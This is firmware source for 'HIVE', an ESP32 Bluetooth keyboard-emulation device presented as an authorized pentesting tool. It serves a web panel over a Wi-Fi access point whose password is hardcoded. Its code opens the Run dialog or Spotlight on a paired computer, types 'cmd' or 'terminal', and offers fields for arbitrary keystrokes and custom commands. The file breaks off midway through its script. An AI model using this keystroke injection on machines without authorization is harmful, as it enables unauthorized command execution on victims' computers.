//
 //* Authorized pentesting tool
 //*/

#include <HijelHID_BLEKeyboard.h>
#include <WiFi.h>
#include <ESPmDNS.h>
#include <WebServer.h>
#include <EEPROM.h>

// ============================================================
//                     CONFIGURATION
// ============================================================
const char* AP_SSID = "Hive";
const char* AP_PASS = "hive";
const char* DOMAIN  = "hive.local";

const int BOOT_BUTTON = 0;
const int LED_PIN = 2;
const int EEPROM_SIZE = 64;
const int KEY_ADDR = 0;
const int PLATFORM_ADDR = 11;

// ============================================================
//                     GLOBALS
// ============================================================
HijelHID_BLEKeyboard keyboard("Hive KB", "HIVEINC", 100);
WebServer server(80);

bool payloadExecuted = false;
uint8_t selectedKey   = 0;
uint8_t selectedMod   = 0;
String  selectedLabel = "None";
String  TARGET_PLATFORM = "windows";

// ============================================================
//                    KEY DEFINITIONS
// ============================================================
struct KeyEntry {
    const char* name;
    uint8_t usageID;
    uint8_t modifier;
};

const KeyEntry keys[] = {
    // Letters
    {"a", KEY_A, 0}, {"b", KEY_B, 0}, {"c", KEY_C, 0}, {"d", KEY_D, 0},
    {"e", KEY_E, 0}, {"f", KEY_F, 0}, {"g", KEY_G, 0}, {"h", KEY_H, 0},
    {"i", KEY_I, 0}, {"j", KEY_J, 0}, {"k", KEY_K, 0}, {"l", KEY_L, 0},
    {"m", KEY_M, 0}, {"n", KEY_N, 0}, {"o", KEY_O, 0}, {"p", KEY_P, 0},
    {"q", KEY_Q, 0}, {"r", KEY_R, 0}, {"s", KEY_S, 0}, {"t", KEY_T, 0},
    {"u", KEY_U, 0}, {"v", KEY_V, 0}, {"w", KEY_W, 0}, {"x", KEY_X, 0},
    {"y", KEY_Y, 0}, {"z", KEY_Z, 0},
    // Numbers
    {"1", KEY_1, 0}, {"2", KEY_2, 0}, {"3", KEY_3, 0}, {"4", KEY_4, 0},
    {"5", KEY_5, 0}, {"6", KEY_6, 0}, {"7", KEY_7, 0}, {"8", KEY_8, 0},
    {"9", KEY_9, 0}, {"0", KEY_0, 0},
    // F keys
    {"F1",  KEY_F1,  0}, {"F2",  KEY_F2,  0}, {"F3",  KEY_F3,  0}, {"F4",  KEY_F4,  0},
    {"F5",  KEY_F5,  0}, {"F6",  KEY_F6,  0}, {"F7",  KEY_F7,  0}, {"F8",  KEY_F8,  0},
    {"F9",  KEY_F9,  0}, {"F10", KEY_F10, 0}, {"F11", KEY_F11, 0}, {"F12", KEY_F12, 0},
    {"F13", KEY_F13, 0}, {"F14", KEY_F14, 0}, {"F15", KEY_F15, 0}, {"F16", KEY_F16, 0},
    {"F17", KEY_F17, 0}, {"F18", KEY_F18, 0}, {"F19", KEY_F19, 0}, {"F20", KEY_F20, 0},
    {"F21", KEY_F21, 0}, {"F22", KEY_F22, 0}, {"F23", KEY_F23, 0}, {"F24", KEY_F24, 0},
    // Arrow keys
    {"Arrow Up",    KEY_UP,    0},
    {"Arrow Down",  KEY_DOWN,  0},
    {"Arrow Left",  KEY_LEFT,  0},
    {"Arrow Right", KEY_RIGHT, 0},
    // Keypad
    {"Keypad /", KEY_KP_SLASH, 0}, {"Keypad *", KEY_KP_ASTERISK, 0},
    {"Keypad -", KEY_KP_MINUS, 0}, {"Keypad +", KEY_KP_PLUS, 0},
    {"Keypad Enter", KEY_KP_ENTER, 0},
    {"Keypad 1", KEY_KP_1, 0}, {"Keypad 2", KEY_KP_2, 0}, {"Keypad 3", KEY_KP_3, 0},
    {"Keypad 4", KEY_KP_4, 0}, {"Keypad 5", KEY_KP_5, 0}, {"Keypad 6", KEY_KP_6, 0},
    {"Keypad 7", KEY_KP_7, 0}, {"Keypad 8", KEY_KP_8, 0}, {"Keypad 9", KEY_KP_9, 0},
    {"Keypad 0", KEY_KP_0, 0}, {"Keypad .", KEY_KP_DOT, 0},
    // Special
    {"Enter",     KEY_RETURN,    0}, {"Escape",    KEY_ESCAPE,    0},
    {"Backspace", KEY_BACKSPACE, 0}, {"Tab",       KEY_TAB,       0},
    {"Space",     KEY_SPACE,     0}, {"Delete",    KEY_DELETE,    0},
    {"Home",      KEY_HOME,      0}, {"End",       KEY_END,       0},
    {"Page Up",   KEY_PAGE_UP,   0}, {"Page Down", KEY_PAGE_DOWN, 0},
    {"Insert",    KEY_INSERT,    0}, {"Caps Lock", KEY_CAPS_LOCK, 0},
    // Modifier combos
    {"Ctrl+C", KEY_C, KEY_MOD_LCTRL}, {"Ctrl+V", KEY_V, KEY_MOD_LCTRL},
    {"Ctrl+X", KEY_X, KEY_MOD_LCTRL}, {"Ctrl+Z", KEY_Z, KEY_MOD_LCTRL},
    {"Ctrl+A", KEY_A, KEY_MOD_LCTRL}, {"Ctrl+S", KEY_S, KEY_MOD_LCTRL},
    {"Alt+F4", KEY_F4, KEY_MOD_LALT}, {"Win+R",  KEY_R, KEY_MOD_LGUI},
    {"Win+D",  KEY_D, KEY_MOD_LGUI}, {"Win+L",  KEY_L, KEY_MOD_LGUI},
    {"Shift+Tab", KEY_TAB, KEY_MOD_LSHIFT},
};

const int NUM_KEYS = sizeof(keys) / sizeof(keys[0]);

// ============================================================
//                    HID HELPERS
// ============================================================
void sendHIDRaw(uint8_t usageID, uint8_t modifier) {
    if (modifier) {
        keyboard.tap(usageID, modifier);
    } else {
        keyboard.tap(usageID);
    }
}

void typeSlowly(const String &text, int delayMs = 40) {
    for (int i = 0; i < text.length(); i++) {
        keyboard.print(String(text[i]));
        delay(delayMs);
    }
}

// ============================================================
//                   EEPROM PERSISTENCE
// ============================================================
void saveKeyToEEPROM(uint8_t usageID, uint8_t modifier) {
    EEPROM.write(KEY_ADDR, usageID);
    EEPROM.write(KEY_ADDR + 1, modifier);
    EEPROM.commit();
    Serial.printf("Saved key to EEPROM: usage=0x%02X, mod=%d\n", usageID, modifier);
}

void savePlatformToEEPROM(String platform) {
    EEPROM.write(PLATFORM_ADDR, platform.length());
    for (int i = 0; i < platform.length() && i < 16; i++) {
        EEPROM.write(PLATFORM_ADDR + 1 + i, platform[i]);
    }
    EEPROM.commit();
    Serial.printf("Saved platform to EEPROM: %s\n", platform.c_str());
}

void loadKeyFromEEPROM() {
    selectedKey = EEPROM.read(KEY_ADDR);
    selectedMod = EEPROM.read(KEY_ADDR + 1);
    
    selectedLabel = "None";
    for (int i = 0; i < NUM_KEYS; i++) {
        if (keys[i].usageID == selectedKey && keys[i].modifier == selectedMod) {
            selectedLabel = String(keys[i].name);
            break;
        }
    }
    
    if (selectedKey != 0) {
        Serial.printf("Loaded key: usage=0x%02X, mod=%d (%s)\n", selectedKey, selectedMod, selectedLabel.c_str());
    } else {
        Serial.println("No key saved in EEPROM.");
    }
}

void loadPlatformFromEEPROM() {
    int len = EEPROM.read(PLATFORM_ADDR);
    if (len > 0 && len < 16) {
        char buf[17];
        for (int i = 0; i < len; i++) {
            buf[i] = EEPROM.read(PLATFORM_ADDR + 1 + i);
        }
        buf[len] = '\0';
        TARGET_PLATFORM = String(buf);
        Serial.printf("Loaded platform: %s\n", TARGET_PLATFORM.c_str());
    }
}

void clearSavedKey() {
    selectedKey = 0;
    selectedMod = 0;
    selectedLabel = "None";
    EEPROM.write(KEY_ADDR, 0);
    EEPROM.write(KEY_ADDR + 1, 0);
    EEPROM.commit();
    Serial.println("Saved key cleared.");
}

// ============================================================
//                    PAYLOAD EXECUTION
// ============================================================
void openRunDialog() {
    if (TARGET_PLATFORM == "macos") {
        keyboard.press(KEY_RGUI);
        delay(100);
        keyboard.tap(KEY_SPACE);
        delay(100);
        keyboard.releaseAll();
        delay(1500);
    } else {
        // Windows / Linux: Win+R or Alt+F2
        if (TARGET_PLATFORM == "linux") {
            keyboard.press(KEY_LALT);
            delay(100);
            keyboard.tap(KEY_F2);
            delay(100);
            keyboard.releaseAll();
        } else {
            keyboard.press(KEY_RGUI);
            delay(100);
            keyboard.tap(KEY_R);
            delay(100);
            keyboard.releaseAll();
        }
        delay(1500);
    }
}

void openTerminal() {
    openRunDialog();
    if (TARGET_PLATFORM == "macos") {
        typeSlowly("terminal");
    } else {
        typeSlowly("cmd");
    }
    delay(200);
    keyboard.tap(KEY_RETURN);
    delay(2500);
}

// ============================================================
//                    WEB SERVER HANDLERS
// ============================================================
void handleRoot() {
    String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>HIVE HID Controller</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --bg-0: #000000; --bg-1: #05050a; --bg-2: #0a0a14;
  --blue: #00d4ff; --green: #00ff88; --purple: #8b5cf6;
  --danger: #ff3860; --text: #e8e8f0; --muted: #7a7a8c;
  --border: rgba(255,255,255,0.08); --glass: rgba(255,255,255,0.03);
  --grad: linear-gradient(135deg, #00d4ff 0%, #00ff88 100%);
}
html, body { min-height: 100vh; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Inter', sans-serif;
  background: var(--bg-0); color: var(--text);
  min-height: 100vh; display: flex; flex-direction: column; align-items: center;
  overflow-x: hidden; position: relative; -webkit-font-smoothing: antialiased;
}
body::before, body::after {
  content: ''; position: fixed; border-radius: 50%; filter: blur(120px);
  opacity: 0.35; z-index: 0; pointer-events: none; animation: float 18s ease-in-out infinite;
}
body::before {
  width: 500px; height: 500px;
  background: radial-gradient(circle, #00d4ff 0%, transparent 70%);
  top: -150px; left: -150px;
}
body::after {
  width: 600px; height: 600px;
  background: radial-gradient(circle, #00ff88 0%, transparent 70%);
  bottom: -200px; right: -200px; animation-delay: -9s;
}
@keyframes float {
  0%, 100% { transform: translate(0,0) scale(1); }
  33% { transform: translate(60px, -40px) scale(1.1); }
  66% { transform: translate(-40px, 60px) scale(0.95); }
}
.container { max-width: 640px; width: 100%; padding: 24px 20px; position: relative; z-index: 1; }
.header { text-align: center; margin: 10px 0 28px; }
h1 {
  font-size: 2.8rem; font-weight: 800; letter-spacing: 0.15em;
  background: var(--grad); -webkit-background-clip: text; background-clip: text;
  -webkit-text-fill-color: transparent;
  filter: drop-shadow(0 0 30px rgba(0,255,136,0.35));
  display: inline-block; position: relative;
}
h1 .bee { display: inline-block; animation: buzz 2.4s ease-in-out infinite; filter: drop-shadow(0 0 12px rgba(0,255,136,0.6)); }
@keyframes buzz {
  0%, 100% { transform: translateY(0) rotate(-4deg); }
  50% { transform: translateY(-4px) rotate(4deg); }
}
.subtitle { color: var(--muted); font-size: 0.85rem; letter-spacing: 0.3em; text-transform: uppercase; margin-top: 6px; }
.card {
  background: linear-gradient(180deg, rgba(255,255,255,0.04) 0%, rgba(255,255,255,0.015) 100%);
  border: 1px solid var(--border); border-radius: 18px; padding: 18px;
  margin-bottom: 20px; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
  position: relative; overflow: hidden;
}
.card::before {
  content: ''; position: absolute; inset: 0; border-radius: 18px; padding: 1px;
  background: var(--grad);
  -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
  -webkit-mask-composite: xor; mask-composite: exclude;
  opacity: 0.25; pointer-events: none;
}
.status-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 4px; border-bottom: 1px solid rgba(255,255,255,0.04); }
.status-row:last-child { border-bottom: none; }
.status-label { color: var(--muted); font-size: 0.85rem; letter-spacing: 0.05em; }
.status-value { font-weight: 600; font-size: 0.9rem; }
.connected { color: var(--green); display: inline-flex; align-items: center; gap: 8px; }
.connected::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--green); box-shadow: 0 0 10px var(--green); animation: pulse 1.8s ease-in-out infinite; }
@keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.3); } }
.disconnected { color: var(--danger); }
.tabs { display: flex; gap: 4px; margin-bottom: 20px; background: rgba(255,255,255,0.03); border-radius: 14px; padding: 4px; border: 1px solid var(--border); }
.tab { flex: 1; padding: 10px 12px; text-align: center; border-radius: 10px; font-size: 0.78rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; transition: all 0.25s; color: var(--muted); border: none; background: transparent; text-transform: uppercase; }
.tab:hover { color: var(--text); background: rgba(255,255,255,0.04); }
.tab.active { color: #000; background: var(--grad); box-shadow: 0 4px 16px rgba(0,255,136,0.3); }
.tab-content { display: none; }
.tab-content.active { display: block; }
.section-title { font-size: 0.75rem; font-weight: 600; letter-spacing: 0.2em; text-transform: uppercase; color: var(--muted); margin: 22px 0 10px; padding-left: 4px; }
.key-display { background: linear-gradient(135deg, rgba(0,212,255,0.08) 0%, rgba(0,255,136,0.08) 100%); border: 1px solid rgba(0,255,136,0.3); border-radius: 16px; padding: 28px 20px; text-align: center; font-size: 1.6rem; font-weight: 700; margin: 0 0 16px; min-height: 80px; display: flex; align-items: center; justify-content: center; color: var(--green); text-shadow: 0 0 20px rgba(0,255,136,0.5); letter-spacing: 0.05em; position: relative; overflow: hidden; backdrop-filter: blur(10px); }
.key-display.none { color: #4a4a5c; border-color: var(--border); text-shadow: none; background: var(--glass); }
.key-display::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(from 0deg, transparent, rgba(0,255,136,0.1), transparent 30%); animation: rotate 6s linear infinite; pointer-events: none; }
@keyframes rotate { to { transform: rotate(360deg); } }
.btn { background: rgba(255,255,255,0.04); color: var(--text); border: 1px solid var(--border); border-radius: 12px; padding: 12px 22px; font-size: 0.9rem; font-weight: 500; cursor: pointer; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); letter-spacing: 0.03em; backdrop-filter: blur(10px); }
.btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); transform: translateY(-1px); }
.btn-primary { background: var(--grad); color: #000; border: none; font-weight: 700; box-shadow: 0 4px 20px rgba(0,255,136,0.3), inset 0 1px 0 rgba(255,255,255,0.3); }
.btn-primary:hover { box-shadow: 0 6px 30px rgba(0,255,136,0.5); background: linear-gradient(135deg, #00e0ff 0%, #00ff99 100%); }
.btn-danger { background: rgba(255,56,96,0.1); color: var(--danger); border: 1px solid rgba(255,56,96,0.3); }
.btn-danger:hover { background: rgba(255,56,96,0.2); border-color: var(--danger); box-shadow: 0 4px 20px rgba(255,56,96,0.25); }
.btn-purple { background: rgba(139,92,246,0.15); color: var(--purple); border: 1px solid rgba(139,92,246,0.3); }
.btn-purple:hover { background: rgba(139,92,246,0.25); border-color: var(--purple); box-shadow: 0 4px 20px rgba(139,92,246,0.25); }
.btn-blue { background: rgba(0,212,255,0.1); color: var(--blue); border: 1px solid rgba(0,212,255,0.3); }
.btn-blue:hover { background: rgba(0,212,255,0.2); border-color: var(--blue); box-shadow: 0 4px 20px rgba(0,212,255,0.25); }
.btn-group { display: flex; gap: 10px; margin: 16px 0; flex-wrap: wrap; justify-content: center; }
.payload-card { background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 14px; padding: 16px; margin-bottom: 14px; transition: all 0.2s; }
.payload-card:hover { border-color: rgba(255,255,255,0.12); }
.payload-card-title { font-size: 0.82rem; font-weight: 600; color: var(--blue); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
.payload-card-title .icon { font-size: 1rem; }
.input-group { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
.input-field { flex: 1; min-width: 180px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 10px; padding: 10px 14px; color: var(--text); font-size: 0.85rem; outline: none; transition: all 0.2s; font-family: inherit; }
.input-field:focus { border-color: var(--blue); box-shadow: 0 0 16px rgba(0,212,255,0.15); background: rgba(0,212,255,0.05); }
.input-field::placeholder { color: #4a4a5c; }
select.input-field { appearance: none; cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%237a7a8c' d='M6 8L0 0h12z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 36px; }
select.input-field option { background: #0a0a14; color: var(--text); }
textarea.input-field { min-height: 80px; resize: vertical; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 0.8rem; line-height: 1.5; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(96px, 1fr)); gap: 8px; margin: 12px 0; }
.category-title { font-size: 0.7rem; color: var(--blue); text-transform: uppercase; letter-spacing: 0.25em; margin: 14px 0 4px; grid-column: 1 / -1; padding: 4px 0; border-bottom: 1px solid rgba(0,212,255,0.15); display: flex; align-items: center; gap: 8px; }
.category-title::before { content: ''; width: 4px; height: 14px; background: var(--grad); border-radius: 2px; box-shadow: 0 0 8px rgba(0,255,136,0.5); }
.key-btn { background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 10px; padding: 10px 6px; font-size: 0.78rem; color: #b8b8c8; cursor: pointer; text-align: center; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); font-weight: 500; position: relative; overflow: hidden; backdrop-filter: blur(6px); }
.key-btn:hover { background: rgba(0,212,255,0.08); border-color: rgba(0,212,255,0.5); color: #fff; transform: translateY(-2px); box-shadow: 0 4px 16px rgba(0,212,255,0.2); }
.key-btn.active { background: var(--grad); color: #000; border-color: transparent; font-weight: 700; box-shadow: 0 4px 20px rgba(0,255,136,0.4), inset 0 1px 0 rgba(255,255,255,0.3); }
.key-btn.active::after { content: ''; position: absolute; inset: 0; background: linear-gradient(135deg, transparent, rgba(255,255,255,0.3), transparent); animation: shimmer 2s linear infinite; }
@keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
.footer { text-align: center; color: #3a3a4a; font-size: 0.75rem; margin-top: 30px; padding: 20px; letter-spacing: 0.15em; text-transform: uppercase; }
::-webkit-scrollbar { width: 8px; }
::-webkit-scrollbar-track { background: var(--bg-0); }
::-webkit-scrollbar-thumb { background: linear-gradient(var(--blue), var(--green)); border-radius: 4px; }
@media (max-width: 480px) { h1 { font-size: 2.2rem; } .grid { grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); } .key-btn { font-size: 0.72rem; padding: 9px 4px; } .key-display { font-size: 1.3rem; } }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1><span class="bee">🐝</span> HIVE</h1>
    <p class="subtitle">Wireless HID Controller</p>
  </div>
  <div class="card">
    <div class="status-row"><span class="status-label">BLE STATUS</span><span class="status-value disconnected" id="bleStatus">Disconnected</span></div>
    <div class="status-row"><span class="status-label">CONNECTED DEVICE</span><span class="status-value" id="deviceName">—</span></div>
    <div class="status-row"><span class="status-label">TARGET PLATFORM</span><span class="status-value" id="targetPlatform">Windows</span></div>
  </div>
  <div class="tabs">
    <button class="tab active" onclick="switchTab('keys')">⌨ Keys</button>
    <button class="tab" onclick="switchTab('payloads')">⚡ Payloads</button>
  </div>
  <div class="tab-content active" id="tab-keys">
    <div class="section-title">Selected Key</div>
    <div class="key-display none" id="selectedKeyDisplay">No key selected</div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="sendKeyNow()">⚡ Send Key Now</button>
      <button class="btn btn-danger" onclick="resetKey()">↺ Reset Key</button>
    </div>
    <div class="section-title">Choose a Key</div>
    <div class="grid" id="keyGrid"></div>
  </div>
  <div class="tab-content" id="tab-payloads">
    <div class="section-title">Platform</div>
    <div class="card" style="padding:12px 16px;">
      <div class="input-group">
        <select class="input-field" id="platformSelect" onchange="setPlatform()">
          <option value="windows">Windows</option>
          <option value="macos">macOS</option>
          <option value="linux">Linux</option>
        </select>
        <button class="btn btn-blue" onclick="setPlatform()">Set Platform</button>
      </div>
    </div>
    <div class="payload-card">
      <div class="payload-card-title"><span class="icon">✏️</span> Type Text</div>
      <div class="input-group">
        <textarea class="input-field" id="typeText" placeholder="Enter text to type..."></textarea>
      </div>
      <div style="margin-top:8px;" class="input-group">
        <input class="input-field" type="number" id="typeDelay" value="40" min="0" max="500" style="min-width:80px; flex:0.3;" placeholder="ms">
        <span style="color:var(--muted); font-size:0.75rem;">ms between chars</span>
      </div>
      <div style="margin-top:10px;"><button class="btn btn-primary" onclick="executePayload('type')">▶ Type It</button></div>
    </div>
    <div class="payload-card">
      <div class="payload-card-title"><span class="icon">🌐</span> Open URL</div>
      <div class="input-group">
        <input class="input-field" id="urlText" type="url" placeholder="https://example.com">
        <button class="btn btn-primary" onclick="executePayload('url')">▶ Open URL</button>
      </div>
    </div>
    <div class="payload-card">
      <div class="payload-card-title"><span class="icon">🔌</span> System Commands</div>
      <div class="input-group">
        <button class="btn btn-danger" onclick="executePayload('shutdown')">⏻ Shutdown</button>
        <button class="btn btn-purple" onclick="executePayload('restart')">⟳ Restart</button>
        <button class="btn btn-blue" onclick="executePayload('lock')">🔒 Lock</button>
        <button class="btn" onclick="executePayload('sleep')">🌙 Sleep</button>
      </div>
    </div>
    <div class="payload-card">
      <div class="payload-card-title"><span class="icon">💻</span> Custom Command</div>
      <div class="input-group">
        <input class="input-field" id="customCmd" placeholder="e.g. ipconfig /all">
        <button class="btn btn-primary" onclick="executePayload('cmd')">▶ Run</button>
      </div>
    </div>
    <div class="section-title">Output</div>
    <div class="key-display none" id="payloadOutput" style="font-size:0.95rem; min-height:50px; padding:16px;">Ready</div>
  </div>
  <p class="footer">HIVE HID Controller · Authorized Pentesting Tool</p>
</div>
<script>
const keyData = [
  {cat:"Letters", name:"a", id:4, mod:0},{cat:"Letters", name:"b", id:5, mod:0},{cat:"Letters", name:"c", id:6, mod:0},{cat:"Letters", name:"d", id:7, mod:0},
  {cat:"Letters", name:"e", id:8, mod:0},{cat:"Letters", name:"f", id:9, mod:0},{cat:"Letters", name:"g", id:10, mod:0},{cat:"Letters", name:"h", id:11, mod:0},
  {cat:"Letters", name:"i", id:12, mod:0},{cat:"Letters", name:"j", id:13, mod:0},{cat:"Letters", name:"k", id:14, mod:0},{cat:"Letters", name:"l", id:15, mod:0},
  {cat:"Letters", name:"m", id:16, mod:0},{cat:"Letters", name:"n", id:17, mod:0},{cat:"Letters", name:"o", id:18, mod:0},{cat:"Letters", name:"p", id:19, mod:0},
  {cat:"Letters", name:"q", id:20, mod:0},{cat:"Letters", name:"r", id:21, mod:0},{cat:"Letters", name:"s", id:22, mod:0},{cat:"Letters", name:"t", id:23, mod:0},
  {cat:"Letters", name:"u", id:24, mod:0},{cat:"Letters", name:"v", id:25, mod:0},{cat:"Letters", name:"w", id:26, mod:0},{cat:"Letters", name:"x", id:27, mod:0},
  {cat:"Letters", name:"y", id:28, mod:0},{cat:"Letters", name:"z", id:29, mod:0},
  {cat:"Numbers", name:"1", id:30, mod:0},{cat:"Numbers", name:"2", id:31, mod:0},{cat:"Numbers", name:"3", id:32, mod:0},{cat:"Numbers", name:"4", id:33, mod:0},
  {cat:"Numbers", name:"5", id:34, mod:0},{cat:"Numbers", name:"6", id:35, mod:0},{cat:"Numbers", name:"7", id:36, mod:0},{cat:"Numbers", name:"8", id:37, mod:0},
  {cat:"Numbers", name:"9", id:38, mod:0},{cat:"Numbers", name:"0", id:39, mod:0},
  {cat:"F Keys", name:"F1", id:58, mod:0},{cat:"F Keys", name:"F2", id:59, mod:0},{cat:"F Keys", name:"F3", id:60, mod:0},{cat:"F Keys", name:"F4", id:61, mod:0},
  {cat:"F Keys", name:"F5", id:62, mod:0},{cat:"F Keys", name:"F6", id:63, mod:0},{cat:"F Keys", name:"F7", id:64, mod:0},{cat:"F Keys", name:"F8", id:65, mod:0},
  {cat:"F Keys", name:"F9", id:66, mod:0},{cat:"F Keys", name:"F10", id:67, mod:0},{cat:"F Keys", name:"F11", id:68, mod:0},{cat:"F Keys", name:"F12", id:69, mod:0},
  {cat:"F Keys", name:"F13", id:104, mod:0},{cat:"F Keys", name:"F14", id:105, mod:0},{cat:"F Keys", name:"F15", id:106, mod:0},{cat:"F Keys", name:"F16", id:107, mod:0},
  {cat:"F Keys", name:"F17", id:108, mod:0},{cat:"F Keys", name:"F18", id:109, mod:0},{cat:"F Keys", name:"F19", id:110, mod:0},{cat:"F Keys", name:"F20", id:111, mod:0},
  {cat:"F Keys", name:"F21", id:112, mod:0},{cat:"F Keys", name:"F22", id:113, mod:0},{cat:"F Keys", name:"F23", id:114, mod:0},{cat:"F Keys", name:"F24", id:115, mod:0},
  {cat:"Arrows", name:"↑ Up", id:82, mod:0},{cat:"Arrows", name:"↓ Down", id:81, mod:0},{cat:"Arrows", name:"← Left", id:80, mod:0},{cat:"Arrows", name:"→ Right", id:79, mod:0},
  {cat:"Keypad", name:"KP /", id:84, mod:0},{cat:"Keypad", name:"KP *", id:85, mod:0},{cat:"Keypad", name:"KP -", id:86, mod:0},{cat:"Keypad", name:"KP +", id:87, mod:0},
  {cat:"Keypad", name:"KP ↵", id:88, mod:0},{cat:"Keypad", name:"KP 1", id:89, mod:0},{cat:"Keypad", name:"KP 2", id:90, mod:0},{cat:"Keypad", name:"KP 3", id:91, mod:0},
  {cat:"Keypad", name:"KP 4", id:92, mod:0},{cat:"Keypad", name:"KP 5", id:93, mod:0},{cat:"Keypad", name:"KP 6", id:94, mod:0},{cat:"Keypad", name:"KP 7", id:95, mod:0},
  {cat:"Keypad", name:"KP 8", id:96, mod:0},{cat:"Keypad", name:"KP 9", id:97, mod:0},{cat:"Keypad", name:"KP 0", id:98, mod:0},{cat:"Keypad", name:"KP .", id:99, mod:0},
  {cat:"Special", name:"Enter", id:40, mod:0},{cat:"Special", name:"Esc", id:41, mod:0},{cat:"Special", name:"⌫ Back", id:42, mod:0},{cat:"Special", name:"Tab", id:43, mod:0},
  {cat:"Special", name:"Space", id:44, mod:0},{cat:"Special", name:"Delete", id:76, mod:0},{cat:"Special", name:"Home", id:74, mod:0},{cat:"Special", name:"End", id:77, mod:0},
  {cat:"Special", name:"PgUp", id:75, mod:0},{cat:"Special", name:"PgDn", id:78, mod:0},{cat:"Special", name:"Insert", id:73, mod:0},{cat:"Special", name:"Caps", id:57, mod:0},
  {cat:"Combos", name:"Ctrl+C", id:6, mod:1},{cat:"Combos", name:"Ctrl+V", id:25, mod:1},{cat:"Combos", name:"Ctrl+X", id:27, mod:1},{cat:"Combos", name:"Ctrl+Z", id:29, mod:1},
  {cat:"Combos", name:"Ctrl+A", id:4, mod:1},{cat:"Combos", name:"Ctrl+S", id:22, mod:1},{cat:"Combos", name:"Alt+F4", id:61, mod:4},{cat:"Combos", name:"Win+R", id:21, mod:8},
  {cat:"Combos", name:"Win+D", id:7, mod:8},{cat:"Combos", name:"Win+L", id:15, mod:8},{cat:"Combos", name:"Shift+Tab", id:43, mod:2},
];
let SELECTED_KEY = 0; let SELECTED_MOD = 0;
function switchTab(t) { document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active')); document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active')); document.querySelector(`.tab[onclick*='${t}']`).classList.add('active'); document.getElementById(`tab-${t}`).classList.add('active'); }
function updateStatus() { fetch('/status').then(r=>r.json()).then(d=>{ const b=document.getElementById('bleStatus'); b.textContent=d.connected?'Connected':'Disconnected'; b.className='status-value '+(d.connected?'connected':'disconnected'); document.getElementById('deviceName').textContent=d.connected?d.deviceName:'—'; document.getElementById('targetPlatform').textContent=d.platform||'Windows'; SELECTED_KEY=d.selectedKey; SELECTED_MOD=d.selectedMod; const dp=document.getElementById('selectedKeyDisplay'); if(d.selectedKey){ dp.textContent=d.selectedLabel||'Key #'+d.selectedKey; dp.className='key-display'; } else { dp.textContent='No key selected'; dp.className='key-display none'; } document.querySelectorAll('.key-btn').forEach(b=>{b.classList.toggle('active',parseInt(b.dataset.id)===d.selectedKey&&parseInt(b.dataset.mod)===d.selectedMod);}); }).catch(()=>{document.getElementById('bleStatus').textContent='Offline';document.getElementById('bleStatus').className='status-value disconnected';}); }
function buildGrid() { const g=document.getElementById('keyGrid'); g.innerHTML=''; let c=''; keyData.forEach(k=>{ if(k.cat&&k.cat!==c){ c=k.cat; const h=document.createElement('div'); h.className='category-title'; h.textContent=k.cat; g.appendChild(h); } const b=document.createElement('button'); b.className='key-btn'; if(k.id===SELECTED_KEY&&k.mod===SELECTED_MOD) b.classList.add('active'); b.dataset.id=k.id; b.dataset.mod=k.mod; b.textContent=k.name; b.onclick=()=>selectKey(k.id,k.mod,k.name); g.appendChild(b); }); }
function selectKey(id,mod,name){ fetch('/select?id='+id+'&mod='+mod+'&name='+encodeURIComponent(name)).then(r=>r.json()).then(d=>{if(d.ok){SELECTED_KEY=id;SELECTED_MOD=mod;document.querySelectorAll('.key-btn').forEach(b=>{b.classList.toggle('active',parseInt(b.dataset.id)===id&&parseInt(b.dataset.mod)===mod);});updateStatus();}}).catch(()=>{});}
function sendKeyNow(){ fetch('/send').then(r=>r.json()).then(d=>{const dp=document.getElementById('selectedKeyDisplay');if(d.ok)dp.textContent='✓ Sent!';else dp.textContent='✗ '+(d.error||'Failed');setTimeout(updateStatus,1500);}).catch(()=>{});}
function resetKey(){ if(confirm('Reset selected key from EEPROM?')){ fetch('/reset').then(r=>r.json()).then(d=>{if(d.ok){SELECTED_KEY=0;SELECTED_MOD=0;document.querySelectorAll('.key-btn').forEach(b=>b.classList.remove('active'));updateStatus();}}).catch(()=>{});}}
function setPlatform(){ const p=document.getElementById('platformSelect').value; fetch('/platform?p='+p).then(r=>r.json()).then(d=>{document.getElementById('targetPlatform').textContent=p.charAt(0).toUpperCase()+p.slice(1);const o=document.getElementById('payloadOutput');o.textContent='✓ Platform set to '+p;o.className='key-display';setTimeout(()=>{o.textContent='Ready';o.className='key-display none';},2000);}).catch(()=>{});}
